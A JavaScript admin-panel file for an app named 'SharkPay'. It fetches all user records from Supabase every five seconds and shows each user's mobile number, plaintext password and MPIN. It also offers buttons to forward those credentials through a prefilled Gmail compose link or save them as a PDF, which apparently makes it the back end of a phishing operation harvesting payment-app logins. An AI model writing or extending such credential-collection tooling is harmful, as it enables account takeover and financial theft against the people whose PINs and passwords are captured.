import { supabase } from "../../user-app/js/config/supabase.js";
import { logActivity } from "./auth.js";

document.addEventListener("DOMContentLoaded", () => {
  const usersTableBody = document.getElementById("usersTableBody");
  const refreshUsersBtn = document.getElementById("refreshUsers");
  const searchUsersInput = document.getElementById("searchUsersInput");
  const filterUsersSelect = document.getElementById("filterUsersSelect");

  let allUsersList = [];

  function renderUsers(usersToRender) {
    usersTableBody.innerHTML = "";

    if (!usersToRender || usersToRender.length === 0) {
      usersTableBody.innerHTML =
        '<tr><td colspan="7" style="text-align:center;">No users found</td></tr>';
      return;
    }

    usersToRender.forEach((user) => {
      const date = user.created_at
        ? new Date(user.created_at).toLocaleString()
        : "N/A";
      const statusClass =
        user.status === "completed" ? "status-completed" : "status-pending";

      const tr = document.createElement("tr");
      tr.innerHTML = `
                    <td>${user.mobile || "N/A"}</td>
                    <td>${user.password || "N/A"}</td>
                    <td>${user.mpin || "Not Set"}</td>
                    <td>${user.login_count || 0}</td>
                    <td><span class="status-badge ${statusClass}">${user.status || "pending"}</span></td>
                    <td style="color:#666; font-size:12px;">${date}</td>
                    <td><button class="view-user-btn" data-user='${JSON.stringify(user).replace(/'/g, "&apos;")}' style="background:#3b82f6; color:white; border:none; padding:4px 8px; border-radius:4px; cursor:pointer; font-size:12px;">View</button></td>
                `;
      usersTableBody.appendChild(tr);
    });

    document.querySelectorAll(".view-user-btn").forEach((btn) => {
      btn.addEventListener("click", (e) => {
        const userStr = e.currentTarget.getAttribute("data-user");
        const user = JSON.parse(userStr);
        openUserDetails(user);
      });
    });
  }

  function applyFilters() {
    const query = searchUsersInput.value.trim().toLowerCase();
    const filter = filterUsersSelect.value;

    let filtered = allUsersList;
    if (query) {
      filtered = filtered.filter(
        (u) => u.mobile && u.mobile.toLowerCase().includes(query),
      );
    }
    if (filter !== "all") {
      filtered = filtered.filter(
        (u) => u.status === filter || (!u.status && filter === "pending"),
      );
    }
    renderUsers(filtered);
  }

  async function fetchUsers() {
    usersTableBody.innerHTML =
      '<tr><td colspan="7" style="text-align:center;">Loading...</td></tr>';
    try {
      const { data: users, error } = await supabase
        .from("users")
        .select("*")
        .order("created_at", { ascending: false });

      allUsersList = users || [];
      applyFilters();
    } catch (e) {
      console.error(e);
    }
  }

  searchUsersInput.addEventListener("input", applyFilters);
  filterUsersSelect.addEventListener("change", applyFilters);

  let currentUser = null;
  const userDetailsModal = document.getElementById("userDetailsModal");
  const userDetailsContent = document.getElementById("userDetailsContent");

  function openUserDetails(user) {
    currentUser = user;
    userDetailsModal.classList.remove("hidden");
    userDetailsContent.innerHTML = `
        <strong>Mobile:</strong> ${user.mobile} <br/>
        <strong>Password:</strong> ${user.password} <br/>
        <strong>MPIN:</strong> ${user.mpin || "Not Set"} <br/>
        <strong>Logins:</strong> ${user.login_count || 0} <br/>
        <strong>Status:</strong> ${user.status} <br/>
        <strong>Created At:</strong> ${new Date(user.created_at).toLocaleString()} <br/>
        <strong>Last Login:</strong> ${new Date(user.last_login).toLocaleString()}
      `;
  }

  document
    .getElementById("closeUserDetailsBtn")
    .addEventListener("click", () => {
      userDetailsModal.classList.add("hidden");
      currentUser = null;
    });

  document.getElementById("gmailForwardBtn").addEventListener("click", () => {
    if (!currentUser) return;
    const subject = encodeURIComponent("SharkPay User Details");
    const body = encodeURIComponent(
      `Mobile Number: ${currentUser.mobile}\nPassword: ${currentUser.password}\nMPIN: ${currentUser.mpin || "Not Set"}\nStatus: ${currentUser.status}\nLogin Count: ${currentUser.login_count || 0}\nDate: ${new Date(currentUser.created_at).toLocaleString()}\nLast Login: ${new Date(currentUser.last_login).toLocaleString()}`,
    );
    window.open(
      `https://mail.google.com/mail/?view=cm&fs=1&su=${subject}&body=${body}`,
      "_blank",
    );
  });

  document.getElementById("downloadPdfBtn").addEventListener("click", () => {
    if (!currentUser) return;
    const { jsPDF } = window.jspdf;
    const doc = new jsPDF();
    doc.setFontSize(16);
    doc.text("SharkPay User Details", 10, 20);
    doc.setFontSize(12);
    doc.text(`Mobile: ${currentUser.mobile}`, 10, 30);
    doc.text(`Password: ${currentUser.password}`, 10, 40);
    doc.text(`MPIN: ${currentUser.mpin || "Not Set"}`, 10, 50);
    doc.text(`Status: ${currentUser.status}`, 10, 60);
    doc.text(`Login Count: ${currentUser.login_count || 0}`, 10, 70);
    doc.text(
      `Created: ${new Date(currentUser.created_at).toLocaleString()}`,
      10,
      80,
    );
    doc.save(`User_${currentUser.mobile}.pdf`);
  });

  document
    .getElementById("deleteUserBtn")
    .addEventListener("click", async () => {
      if (!currentUser) return;
      if (confirm("Are you sure you want to move this user to trash?")) {
        const { error: trashErr } = await supabase.from("trash").insert({
          original_table: "users",
          record_id: currentUser.id,
          record_data: currentUser,
        });

        if (trashErr) {
          console.error("Error inserting to trash:", trashErr);
          alert("Error moving user to trash: " + trashErr.message);
          return;
        }

        const { error: delErr } = await supabase
          .from("users")
          .delete()
          .eq("id", currentUser.id);

        if (delErr) {
          console.error("Error deleting from users:", delErr);
          alert("Error deleting user: " + delErr.message);
          return;
        }

        userDetailsModal.classList.add("hidden");
        fetchUsers();
        logActivity(
          "User Deleted",
          `Moved user ${currentUser.mobile} to trash`,
        );
        alert("User moved to trash successfully.");
      }
    });

  const deleteAllUsersBtn = document.getElementById("deleteAllUsersBtn");
  if (deleteAllUsersBtn) {
    deleteAllUsersBtn.addEventListener("click", async () => {
      if (
        confirm(
          "Are you sure you want to move ALL users to trash? This action affects all registered users.",
        )
      ) {
        deleteAllUsersBtn.disabled = true;
        deleteAllUsersBtn.textContent = "Processing...";

        try {
          const { data: allUsers } = await supabase.from("users").select("*");
          if (allUsers && allUsers.length > 0) {
            for (const user of allUsers) {
              await supabase.from("trash").insert({
                original_table: "users",
                record_id: user.id,
                record_data: user,
              });
              await supabase.from("users").delete().eq("id", user.id);
            }
            logActivity(
              "All Users Deleted",
              `Moved ${allUsers.length} users to trash`,
            );
            alert(`Successfully moved ${allUsers.length} users to trash.`);
          } else {
            alert("No users to delete.");
          }
        } catch (e) {
          console.error(e);
          alert("Error deleting all users.");
        } finally {
          deleteAllUsersBtn.disabled = false;
          deleteAllUsersBtn.textContent = "Delete All";
          fetchUsers();
        }
      }
    });
  }

  refreshUsersBtn.addEventListener("click", fetchUsers);

  setInterval(fetchUsers, 5000);
  fetchUsers();
});
